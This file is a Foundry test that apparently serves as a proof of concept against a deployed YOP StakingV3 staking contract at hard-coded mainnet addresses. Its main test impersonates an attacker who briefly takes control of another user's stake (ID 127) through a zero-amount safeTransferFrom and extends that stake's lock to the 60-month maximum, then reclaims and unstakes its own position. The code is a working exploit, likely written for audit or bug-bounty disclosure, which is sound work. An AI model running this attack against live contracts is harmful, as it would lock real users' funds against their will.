// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "forge-std/Test.sol";
import "StakingV3/StakingV3/contracts/staking/stakingV3/StakingV3.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    IERC20 yopToken = IERC20(0xAE1eaAE3F627AAca434127644371b67B18444051);
    StakingV3 staking = StakingV3(0x5B705d7c6362A73fD56D5bCedF09f4E40C2d3670);
    address attacker1 = address(1);
    uint8 MAX_STAKE_DURATION_MONTHS = 60;
    uint256 public constant SECONDS_PER_MONTH = 2629743; // 1 month/30.44 days

    using stdStorage for StdStorage;

    function writeTokenBalance(
        address who,
        IERC20 token,
        uint256 amt
    ) internal {
        stdstore
            .target(address(token))
            .sig(token.balanceOf.selector)
            .with_key(who)
            .checked_write(amt);
    }

    function setUp() public {
        writeTokenBalance(attacker1, yopToken, 500 ether);
    }

    function testExample() public {
        vm.startPrank(attacker1);
        uint8 lock_duration_months = 1;
        yopToken.approve(address(staking), 500 ether);
        staking.stake(500 ether, lock_duration_months);
    }

    function testYopMaliciousLocking() public {
        deal(address(yopToken), attacker1, 500 ether);
        //Impersonate attacker for subsequent calls to contracts
        startHoax(attacker1);
        uint8 lock_duration_months = 1;
        uint realStakeId = 127;
        uint additionalAmount = 0;
        //Create a staking position
        yopToken.approve(address(staking), 500 ether);
        uint attackerStakeId = staking.stake(500 ether, 1);
        staking.safeTransferFrom(attacker1, attacker1, realStakeId, additionalAmount, '');
        //The stake with id 127 is locked for 3 months
        uint8 lockTimeRealStakeId = 3;
        
        //We lock the stake for the maximal duration
        staking.extendStake(
            realStakeId,
            MAX_STAKE_DURATION_MONTHS-lockTimeRealStakeId,
            0,
            new address[](0)
        );
        //The beautiful thing is that the attacker can regain control of his stake
        staking.safeTransferFrom(attacker1, attacker1, attackerStakeId, additionalAmount, '');
        //Standard cheat for elapsing given time in seconds
        skip(lock_duration_months*SECONDS_PER_MONTH+1);
        staking.unstakeSingle(attackerStakeId, attacker1);
    }
}
